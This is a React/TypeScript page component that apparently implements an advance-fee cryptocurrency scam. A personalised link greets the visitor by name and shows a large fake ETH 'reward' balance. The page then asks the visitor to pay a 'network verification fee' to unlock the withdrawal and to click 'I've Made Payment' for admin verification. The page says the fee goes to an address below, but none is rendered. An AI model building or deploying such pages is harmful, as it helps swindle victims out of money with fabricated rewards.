import { useRoute } from "wouter";
import { useUser } from "@/hooks/use-users";
import { useWithdrawalRequest } from "@/hooks/use-withdrawal";
import { UserLayout } from "@/components/layout/user-layout";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { formatEth, formatDollar, truncateWallet } from "@/lib/utils";
import { Copy, ArrowDownCircle, Info, CheckCircle2 } from "lucide-react";
import { motion } from "framer-motion";
import { useState } from "react";
import { useToast } from "@/hooks/use-toast";
import { useQueryClient } from "@tanstack/react-query";
import { getGetWithdrawalRequestQueryKey } from "@workspace/api-client-react";

export default function UserCongrats() {
  const [, params] = useRoute("/u/:slug");
  const slug = params?.slug || "";
  const { data: user, isLoading, isError } = useUser(slug);
  const { data: withdrawalRequest, isLoading: wrLoading } = useWithdrawalRequest(slug);
  const queryClient = useQueryClient();
  const { toast } = useToast();

  const [copied, setCopied] = useState(false);
  const [withdrawAmount, setWithdrawAmount] = useState<string>("");

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSubmitPayment = async () => {
    const amount = parseFloat(withdrawAmount);
    if (!amount || amount <= 0) {
      toast({ title: "Enter a valid amount", variant: "destructive" });
      return;
    }
    if (user && amount > user.eligibleBalance) {
      toast({ title: "Amount exceeds your eligible balance", variant: "destructive" });
      return;
    }

    try {
      const res = await fetch(`/api/withdrawal-requests/${slug}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestedAmount: amount }),
      });

      if (!res.ok) {
        const errData = await res.json().catch(() => ({}));
        throw new Error(errData.error || "Failed to submit");
      }

      queryClient.invalidateQueries({ queryKey: getGetWithdrawalRequestQueryKey(slug) });

      queryClient.invalidateQueries({ queryKey: ["withdrawal-request", slug] }); // extra trigger for admin page

      toast({
        title: "Payment notification sent!",
        description: "Waiting for admin verification.",
      });
      setWithdrawAmount("");
    } catch (err: any) {
      toast({
        title: "Error",
        description: err.message || "Something went wrong",
        variant: "destructive",
      });
    }
  };

  if (isLoading || wrLoading) {
    return (
      <UserLayout slug={slug}>
        <div className="min-h-screen flex items-center justify-center">
          <div className="w-12 h-12 border-4 border-primary border-t-transparent rounded-full animate-spin" />
        </div>
      </UserLayout>
    );
  }

  if (isError || !user) {
    return (
      <UserLayout slug={slug}>
        <div className="min-h-screen flex items-center justify-center p-6 text-center">
          <Card className="max-w-md w-full">
            <CardContent className="pt-6">
              <h2 className="text-2xl font-bold text-destructive mb-2">Account Not Found</h2>
              <p className="text-muted-foreground">The personalized link you followed is invalid or has expired.</p>
            </CardContent>
          </Card>
        </div>
      </UserLayout>
    );
  }

  return (
    <UserLayout slug={slug}>
      <div className="max-w-3xl mx-auto px-4 sm:px-6 pt-12 pb-24 space-y-8">

        {/* Header */}
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="text-center space-y-4">
          <div className="inline-flex items-center justify-center p-3 bg-primary/10 rounded-full mb-4 shadow-[0_0_30px_rgba(34,211,238,0.2)]">
            <img src="/logo.jpeg" alt="Crypto Rewards Logo" className="w-8 h-8" />
          </div>
          <h1 className="text-4xl md:text-5xl lg:text-6xl font-display font-bold">
            Congratulations, <span className="text-gradient">{user.name}</span>!
          </h1>
          <p className="text-lg text-muted-foreground">Your rewards are ready. Follow the instructions below.</p>
        </motion.div>

        {/* Balance card */}
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
          <Card className="overflow-hidden border-primary/20 shadow-[0_0_50px_rgba(34,211,238,0.05)]">
            <div className="bg-gradient-to-r from-primary/10 to-transparent p-6 text-center border-b border-white/5">
              <p className="text-sm font-medium text-primary uppercase tracking-widest mb-2">Available Balance</p>
              <h2 className="text-5xl md:text-6xl font-display font-bold text-white">
                {formatDollar(user.eligibleBalance)} worth of ETH
              </h2>
            </div>

            <CardContent className="p-6 md:p-8 space-y-6">
              {/* Wallet */}
              <div className="flex flex-col sm:flex-row items-center justify-between p-4 rounded-xl bg-white/5 border border-white/10 gap-4">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-full bg-secondary flex items-center justify-center">
                    <ArrowDownCircle className="w-5 h-5 text-muted-foreground" />
                  </div>
                  <div>
                    <p className="text-sm text-muted-foreground">Connected Wallet</p>
                    <p className="font-mono">{truncateWallet(user.walletAddress)}</p>
                  </div>
                </div>
                <Button variant="secondary" size="sm" onClick={() => copyToClipboard(user.walletAddress)}>
                  {copied ? <CheckCircle2 className="w-4 h-4 mr-2 text-green-400" /> : <Copy className="w-4 h-4 mr-2" />}
                  {copied ? "Copied" : "Copy Address"}
                </Button>
              </div>

              {/* Fee */}
              <div className="rounded-xl border border-amber-500/30 bg-amber-500/10 p-6 relative overflow-hidden">
                <div className="absolute top-0 left-0 w-1 h-full bg-amber-500" />
                <div className="flex items-start gap-4">
                  <Info className="w-6 h-6 text-amber-400 shrink-0 mt-0.5" />
                  <div className="space-y-3">
                    <h3 className="text-lg font-semibold text-white">Withdrawal Fee Required</h3>
                    <p className="text-muted-foreground">
                      To unlock your withdrawal, send a network verification fee of{" "}
                      <strong className="text-amber-400">{formatEth(user.withdrawalFeeEth)}</strong> ETH to the address below.
                    </p>
                  </div>
                </div>
              </div>

              {/* Payment form */}
              <div className="space-y-4">
                <Input
                  type="number"
                  step="0.0001"
                  placeholder="Enter amount you paid"
                  value={withdrawAmount}
                  onChange={(e) => setWithdrawAmount(e.target.value)}
                />
                <Button onClick={handleSubmitPayment} className="w-full" size="lg">
                  I've Made Payment
                </Button>
              </div>
            </CardContent>
          </Card>
        </motion.div>
      </div>
    </UserLayout>
  );
}
